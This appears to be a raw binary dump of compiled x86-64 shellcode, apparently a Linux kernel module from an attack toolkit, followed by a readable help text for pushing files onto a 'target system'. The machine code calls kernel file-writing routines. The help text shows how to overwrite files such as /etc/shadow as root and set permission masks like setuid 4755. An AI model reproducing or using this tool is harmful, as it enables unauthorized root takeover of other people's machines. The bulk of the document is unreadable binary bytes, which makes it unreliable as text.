7�<Ҏ*�^w���YK��Ɍi�c�c�hɅ��W���       L      �      d                                       QH���7��PVH��H���H�� ��  H��^XX�AWAVAUATL��L��M��I��M��I��I��K�.�"   H��tK�,M��u�H3�H���H3�A\A]A^A_�H��WVH��I��I��H�L$8L�D$@L�L$HAWL��H���H�� ��I��A_^_�QRH3�H���7��H��H��H;�u�H��ZY������H�  H��AWL��H���AQAPH�� L��L��H��H������H�  H� ��I��A_�H�     ���H��H�     ���H+�H��H��H���	�@UH�l$�H��   H�I3��EL�E#H�U'�EmA�   H�E�EfilpH�E'H�E�H�E/H�E�H�E7H�EH�E?H�EgH�EG�E_clof�Ese�E�filp�E�_opef�E�n �E�vfs_�E�writf�E�e �Ekern�Eel_w�Erite�Egmemcf�Ekpy�?���H�Đ   ]���H�\$WH��`H�d$p H��H��(   u�  �H��   �   H�T$0������u�  �H��   �   H�L$PH��   L��H��   A�  ����L��   A�A�  H�L$8H�������H��H�    ����H;�v�  ��H�D$HH��L��  LG(H�L$@H��L��   HE�H�D$pH�D$ ����H�L$0E3�H��H��(  ����H�\$xH��`_�PUSH FILES TO TARGET SYSTEM                                     
LINUX X64 EDITION                                               
=============================================================== 
Push a file from the local system to the target system.         
WARNING! Existing files will be overwritten!                    
* Files created will be created with root as owner/group and get 
  the access mask specified in the -0 parameter.                
* Files overwritten will keep the access mask and owner/group.  
REQUIRED OPTIONS:                                               
  -in  : file to push to target system from this system.        
         filename is given in normal format.                    
         Example: '-in c:\temp\shadow'                          
  -s : file on target system.                                   
         Example: '-s /etc/shadow'                              
  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!     
         NB! linux file masks are ususally typed in octal -     
         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)   
         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)   
         Example: '-0 0x1ff'                                    
  -1   : run flag - set to non zero to push file.               
===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================ 
FILE NAME     : %s 
RESULT CODE   : 0x%08X 
BYTES WRITTEN : 0x%08X 
=============================================================== 
 